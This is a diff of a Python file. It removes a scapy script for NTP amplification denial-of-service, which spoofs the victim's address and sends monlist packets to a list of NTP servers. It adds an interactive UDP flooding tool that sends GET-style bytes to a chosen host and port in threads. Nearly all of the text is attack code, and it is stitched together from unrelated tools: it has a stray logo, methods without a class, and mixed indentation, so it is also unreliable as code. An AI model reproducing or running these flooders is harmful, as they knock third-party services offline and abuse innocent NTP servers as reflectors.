@@ -1,18 +1,11 @@
-#!/usr/bin/env python3
-from scapy.all import *
-import sys
+import os
+import socket
+import string
+import random
 import threading
-import time
-#NTP Amp DOS attack
-#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
-#FOR USE ON YOUR OWN NETWORK ONLY
-#packet sender
+import fade
+from colorama import Fore, Back, Style
 
-def deny():
-    global ntplist
-    global currentserver
-    global data
-    global target
 
 os.system("Clear")
 logo = """
@@ -30,70 +23,77 @@ _—\033[34m                     design by: KunF24                      _—
 _—\033[35m                         ——oO0Oo——                          _—
 _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
 """
-faded_text = fade.fire(logo)
-print(faded_text)
-print("\033[32mWelcome to KF22-DDoS\033[0m")
-ntpserver = ntplist[currentserver] #Get new server
-currentserver = currentserver + 1 #Increment for next
-packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
-send(packet,loop=1) #SEND IT
+		print(Fore.RED+banner)
+		print(Fore.YELLOW+"""
+		[+] An Advance DDOS Tool Using Sockets Written in Python [+]"""+Fore.GREEN+"""
+		[+] Developer : Kanao#7218 [ """+Fore.WHITE+"""SecretsX ]""")
+		print(Fore.WHITE+"""
+		[+] Type `help` If You Are A Beginner [+]
+			""")
 
-#So I dont have to have the same stuff twice
-def printhelp():
-    print("NTP Amplification DOS Attack")
-    print("By DaRkReD")
-    print("Usage ntpdos.py <target ip> <ntpserver list> <number of threads>")
-    print("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
-    print("NTP serverlist file should contain one IP per line")
-    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
-    exit(0)
+	def start_attack(self,host,port=None):
+		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+		try:
+			url_path=str(string.ascii_letters + string.digits + string.punctuation)
+			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+			if not port:
+				self.sock.sendto(byt,(host,80))
+			elif port:
+				self.sock.sendto(byt,(host,int(port)))
+			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
+		except Exception as e:
+			print(Fore.RED+f"""
+	[-] Socket ERROR! Fatal X_X
+	[-] EXCEPTION : {e}
+						""")
 
-if len(sys.argv) < 4:
-    printhelp()
-#Fetch Args
-target = sys.argv[1]
+	def command_parser(self,command):
+		if command=="help":
+			print(Fore.WHITE+"""
+	Welcome To PsyFlood Help Menu - 
 
-#Help out idiots
-if target in ("help","-h","h","?","--h","--help","/?"):
-    printhelp()
+	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
+	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
+	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
+	(+) start - Will start attacking and display outputs on console
+	""")
+		if "host " in command:
+			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Host as {self.host}
+				""")
+		elif "port " in command:
+			self.portnum=command.replace("port ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Port to {self.portnum}
+				""")
+		elif command=="start":
+			print(self.portnum)
+			if self.host and self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+			elif self.host and not self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host)).start()
+		elif "attacks " in command:
+			self.threads=command.replace("attacks ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Threads to {self.threads}
+				""")
 
-ntpserverfile = sys.argv[2]
-numberthreads = int(sys.argv[3])
-#System for accepting bulk input
-ntplist = []
-currentserver = 0
-with open(ntpserverfile) as f:
-    ntplist = f.readlines()
+	def run(self):
+		self.graphics()
+		while True:
+			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))
 
-    
-
-
-
-#Make sure we dont out of bounds
-if numberthreads > int(len(ntplist)):
-    print("Attack Aborted: More threads than servers")
-    print("Next time dont create more threads than servers")
-exit(0)
-
-#Magic Packet aka NTP v2 Monlist Packet
-data = "\x17\x00\x03\x2a" + "\x00" * 4
-
-#Hold our threads
-threads = []
-print("Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
-print("Use CTRL+C to stop attack")
-
-#Thread spawner
-for n in range(numberthreads):
-    thread = threading.Thread(target=deny)
-    thread.daemon = True
-    thread.start()
-
-    threads.append(thread)
-
-#In progress!
-print("Sending...")
-
-#Keep alive so ctrl+c still kills all them threads
-while True:
-    time.sleep(1)
+if __name__=="__main__":
+	app=SockFlood()
+	app.run()
